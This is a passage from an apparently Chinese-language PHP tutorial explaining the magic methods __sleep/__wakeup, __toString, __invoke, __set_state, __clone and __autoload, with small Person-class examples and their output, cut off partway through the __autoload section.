class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span>, <span class="variable">$sex</span>=<span class="string">&#x27;男&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * __wakeup</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line">        <span class="comment">// 这里不需要返回数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;小明&#x27;</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$person</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$person</span>)));</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line"><span class="type">string</span>(<span class="number">58</span>) <span class="string">&quot;O:6:&quot;</span>Person<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:8:&quot;</span><span class="number">5</span>bCP5piO<span class="string">&quot;;s:3:&quot;</span>age<span class="string">&quot;;i:25;&#125;&quot;</span> 当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line">当在类外部使用unserialize()时会调用这里的__wakeup()方法</span><br><span class="line">object(Person)#<span class="number">2</span> (<span class="number">3</span>) &#123; [<span class="string">&quot;sex&quot;</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">&quot;男&quot;</span> [<span class="string">&quot;name&quot;</span>]=&gt; <span class="type">int</span>(<span class="number">2</span>) [<span class="string">&quot;age&quot;</span>]=&gt; <span class="type">int</span>(<span class="number">25</span>) &#125;</span><br></pre></td></tr></table></figure><h3 id="十一、-toString-，类被当成字符串时的回应方法"><a href="#十一、-toString-，类被当成字符串时的回应方法" class="headerlink" title="十一、 __toString()，类被当成字符串时的回应方法"></a>十一、 __toString()，类被当成字符串时的回应方法</h3><p>作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__toString</span>() 方法用于一个类被当成字符串时应怎样回应。例如 `<span class="keyword">echo</span> <span class="variable">$obj</span>;` 应该显示些什么。</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此方法必须返回一个字符串，否则将发出一条 <span class="string">`E_RECOVERABLE_ERROR`</span> 级别的致命错误。</span><br></pre></td></tr></table></figure><p>警告：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能在 __toString() 方法中抛出异常。这么做会导致致命错误。</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span>, <span class="variable">$sex</span>=<span class="string">&#x27;男&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">&#x27;go go go&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;小明&#x27;</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person</span>;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="keyword">go</span> <span class="keyword">go</span></span><br></pre></td></tr></table></figure><p>那么如果类中没有 __toString() 这个魔术方法运行会发生什么呢？让我们来测试下：</p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span>, <span class="variable">$sex</span>=<span class="string">&#x27;男&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;小明&#x27;</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person</span>;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Catchable</span> fatal <span class="attr">error</span>: <span class="title class_">Object</span> <span class="keyword">of</span> <span class="keyword">class</span> <span class="title class_">Person</span> could not be converted to <span class="built_in">string</span> <span class="keyword">in</span> <span class="attr">D</span>:\phpStudy\<span class="variable constant_">WWW</span>\test\index.<span class="property">php</span> on line <span class="number">18</span></span><br></pre></td></tr></table></figure><p>很明显，页面报了一个致命错误，这是语法所不允许的。</p><h3 id="十二、-invoke-，调用函数的方式调用一个对象时的回应方法"><a href="#十二、-invoke-，调用函数的方式调用一个对象时的回应方法" class="headerlink" title="十二、 __invoke()，调用函数的方式调用一个对象时的回应方法"></a>十二、 __invoke()，调用函数的方式调用一个对象时的回应方法</h3><p>作用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本特性只在 PHP 5.3.0 及以上版本有效。</span><br></pre></td></tr></table></figure><p>直接上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span>, <span class="variable">$sex</span>=<span class="string">&#x27;男&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;这可是一个对象哦&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;小明&#x27;</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="variable">$person</span>();</span><br></pre></td></tr></table></figure><p>查看运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这可是一个对象哦</span><br></pre></td></tr></table></figure><p>当然，如果你执意要将对象当函数方法使用，那么会得到下面结果：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Fatal</span> <span class="attr">error</span>: <span class="title class_">Function</span> name must be a <span class="built_in">string</span> <span class="keyword">in</span> <span class="attr">D</span>:\phpStudy\<span class="variable constant_">WWW</span>\test\index.<span class="property">php</span> on line <span class="number">18</span></span><br></pre></td></tr></table></figure><h3 id="十三、-set-state-，调用var-export-导出类时，此静态方法会被调用。"><a href="#十三、-set-state-，调用var-export-导出类时，此静态方法会被调用。" class="headerlink" title="十三、 __set_state()，调用var_export()导出类时，此静态方法会被调用。"></a>十三、 __set_state()，调用var_export()导出类时，此静态方法会被调用。</h3><p>作用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自 PHP 5.1.0 起，当调用 var_export() 导出类时，此静态方法会被自动调用。</span><br></pre></td></tr></table></figure><p>参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本方法的唯一参数是一个数组，其中包含按 <span class="keyword">array</span>(<span class="string">&#x27;property&#x27;</span> =&gt; value, ...) 格式排列的类属性。</span><br></pre></td></tr></table></figure><p>下面我们先来看看在没有加 __set_state() 情况按下，代码及运行结果如何：</p><p>上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span>, <span class="variable">$sex</span>=<span class="string">&#x27;男&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;小明&#x27;</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="title function_ invoke__">var_export</span>(<span class="variable">$person</span>);</span><br></pre></td></tr></table></figure><p>看结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Person</span>::<span class="title function_ invoke__">__set_state</span>(<span class="keyword">array</span>( <span class="string">&#x27;sex&#x27;</span> =&gt; <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">25</span>, ))</span><br></pre></td></tr></table></figure><p>很明显，将对象中的属性都打印出来了</p><p>加了 __set_state() 之后：</p><p>继续上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span>, <span class="variable">$sex</span>=<span class="string">&#x27;男&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__set_state</span>(<span class="params"><span class="variable">$an_array</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="variable">$a</span>-&gt;name = <span class="variable">$an_array</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;小明&#x27;</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="variable">$person</span>-&gt;name = <span class="string">&#x27;小红&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_export</span>(<span class="variable">$person</span>);</span><br></pre></td></tr></table></figure><p>继续看结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Person</span>::<span class="title function_ invoke__">__set_state</span>(<span class="keyword">array</span>( <span class="string">&#x27;sex&#x27;</span> =&gt; <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;小红&#x27;</span>, <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">25</span>, ))</span><br></pre></td></tr></table></figure><h3 id="十四、-clone-，当对象复制完成时调用"><a href="#十四、-clone-，当对象复制完成时调用" class="headerlink" title="十四、 __clone()，当对象复制完成时调用"></a>十四、 __clone()，当对象复制完成时调用</h3><p>在多数情况下，我们并不需要完全复制一个对象来获得其中属性。但有一个情况下确实需要：如果你有一个 GTK 窗口对象，该对象持有窗口相关的资源。你可能会想复制一个新的窗口，保持所有属性与原来的窗口相同，但必须是一个新的对象（因为如果不是新的对象，那么一个窗口中的改变就会影响到另一个窗口）。还有一种情况：如果对象 A 中保存着对象 B 的引用，当你复制对象 A 时，你想其中使用的对象不再是对象 B 而是 B 的一个副本，那么你必须得到对象 A 的一个副本。</p><p>作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象复制可以通过 <span class="keyword">clone</span> 关键字来完成（如果可能，这将调用对象的 <span class="title function_ invoke__">__clone</span>() 方法）。对象中的 <span class="title function_ invoke__">__clone</span>() 方法不能被直接调用。</span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$copy_of_object</span> = <span class="keyword">clone</span> <span class="variable">$object</span>;</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当对象被复制后，PHP <span class="number">5</span> 会对对象的所有属性执行一个浅复制（shallow <span class="built_in">copy</span>）。所有的引用属性 仍然会是一个指向原来的变量的引用。</span><br><span class="line"></span><br><span class="line">当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用，可用于修改属性的值（如果有必要的话）。</span><br></pre></td></tr></table></figure><p>看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span>, <span class="variable">$sex</span>=<span class="string">&#x27;男&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>.<span class="string">&quot;你正在克隆对象&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;小明&#x27;</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="variable">$person2</span> = <span class="keyword">clone</span> <span class="variable">$person</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;persion1:&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$person</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;persion2:&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$person2</span>);</span><br></pre></td></tr></table></figure><p>看结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Person::__clone你正在克隆对象</span><br><span class="line"><span class="type">string</span>(<span class="number">9</span>) <span class="string">&quot;persion1:&quot;</span> object(Person)#<span class="number">1</span> (<span class="number">3</span>) &#123; [<span class="string">&quot;sex&quot;</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">&quot;男&quot;</span> [<span class="string">&quot;name&quot;</span>]=&gt; <span class="type">string</span>(<span class="number">6</span>) <span class="string">&quot;小明&quot;</span> [<span class="string">&quot;age&quot;</span>]=&gt; <span class="type">int</span>(<span class="number">25</span>) &#125; </span><br><span class="line"><span class="type">string</span>(<span class="number">9</span>) <span class="string">&quot;persion2:&quot;</span> object(Person)#<span class="number">2</span> (<span class="number">3</span>) &#123; [<span class="string">&quot;sex&quot;</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">&quot;男&quot;</span> [<span class="string">&quot;name&quot;</span>]=&gt; <span class="type">string</span>(<span class="number">6</span>) <span class="string">&quot;小明&quot;</span> [<span class="string">&quot;age&quot;</span>]=&gt; <span class="type">int</span>(<span class="number">25</span>) &#125;</span><br></pre></td></tr></table></figure><p>克隆成功。</p><h3 id="十五、-autoload-，尝试加载未定义的类"><a href="#十五、-autoload-，尝试加载未定义的类" class="headerlink" title="十五、__autoload()，尝试加载未定义的类"></a>十五、__autoload()，尝试加载未定义的类</h3><p>作用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你可以通过定义这个函数来启用类的自动加载。</span><br></pre></td></tr></table></figure><p>在魔术函数 <code>__autoload()</code> 方法出现以前，如果你要在一个程序文件中实例化100个对象，那么你必须用include或者require包含进来100个类文件，或者你把这100个类定义在同一个类文件中 —— 相信这个文件一定会非常大，然后你就痛苦了。</p><p>但是有了 <code>__autoload()</code> 方法，以后就不必为此大伤脑筋了，这个类会在你实例化对象之前自动加载制定的文件。</p><p>还是通过例子来看看吧：</p><p>先看看以往的方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 文件non_autoload.php </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line">   </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;project/class/A.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;project/class/B.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;project/class/C.php&#x27;</span>);  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (条件A) &#123;  </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();  </span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();  </span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件B) &#123;  </span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">newA</span>();  </span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span 